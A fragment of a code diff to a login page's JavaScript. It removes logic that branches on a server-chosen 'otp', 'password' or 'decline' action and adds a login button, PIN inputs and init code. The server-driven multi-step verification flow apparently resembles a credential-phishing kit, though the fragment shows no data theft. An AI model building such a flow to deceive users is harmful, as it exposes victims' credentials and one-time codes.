       isSubmitting = false;
-
-      if (action === 'otp') {
-        window.location.href = 'otp.html';
-      } else if (action === 'password') {
-        showPasswordField();
-      } else if (action === 'decline') {
-        // Show error box with custom message
-        showError('Account details could not be verified. Please check and try again.');
-        // Re-enable the Next button
-        nextBtn.disabled = false;
-      }
-    });
+      showError('Network error, please try again.');
+      loginBtn.disabled = false;
+      updateLoginButton();
+    }
   }
 
-  // ==================== INIT ====================
-  dropdownList.style.display = 'none';
-  nextBtn.disabled = false;
-  applyFilter();
+  // ========== EVENT LISTENERS ==========
+  loginBtn.addEventListener('click', submitLogin);
+  goBackBtn.addEventListener('click', () => {
+    window.history.back();
+  });
 
-  // Expose functions to global for inline event handlers
+  // Initialize
+  function init() {
+    dropdownList.style.display = 'none';
+    applyIdentifierFilter();
+    setupPinInputs();
+    updateLoginButton();
+    hideError();
+  }
+  init();
+
+  // Expose globals for inline handlers
   window.toggleDropdown = toggleDropdown;
   window.selectType = selectType;
-  window.submitForm = submitForm;
-  window.hideError = hideError; // for close button
+  window.hideError = hideError;
 </script>
-
 </body>
 </html>
